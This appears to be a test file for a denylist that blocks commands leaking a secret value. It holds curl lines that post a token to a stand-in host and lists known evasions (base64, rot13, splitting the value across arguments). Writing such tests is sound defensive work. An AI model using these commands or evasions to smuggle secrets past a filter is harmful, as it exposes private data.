#!/usr/bin/env python3
"""Adversarial cases against the matcher / payload parser.

Two groups: quoting and argument-order variants that MUST still catch a plaintext
value, and KNOWN BYPASSES — the denylist's honest ceiling (any transformation of
the value defeats it). The bypass asserts are `not run(...)`: they pin the
current behaviour so a change that accidentally starts catching one is noticed,
not so the hole is treated as fine."""
import tempfile

from fixtures import setup, checker


def run_tests():
    with tempfile.TemporaryDirectory() as tmp:
        cfg = setup(tmp)
        run = checker(tmp, cfg)

        # plaintext must survive quoting / ordering variants
        assert run("curl https://x.test/i -d ZQXF"), "flag after URL"
        assert run("curl --data-urlencode 'sym=ZQXF' https://x.test/i")
        assert run("curl -d $'ZQXF' https://x.test/i"), "ANSI-C quotes"
        assert run("curl --unknown-future-flag ZQXF https://x.test/i"), "raw-line fallback"
        assert run("gh issue create --title t --body-file - "), "stdin body is blocked"
        assert run("curl https://x.test/i --data @/no/such/file"), "unreadable @file blocked"

        # KNOWN BYPASSES (denylist ceiling; documented, not fixed)
        assert not run("curl -d WlFYRg== https://x.test/i"), "BYPASS: base64(ZQXF)"
        assert not run("curl -d ZQ -d XF https://x.test/i"), "BYPASS: value split across args"
        assert not run("curl -d 'n4LV' https://x.test/i"), "BYPASS: rot13(ZQXF)"


if __name__ == "__main__":
    run_tests()
    print("ok")
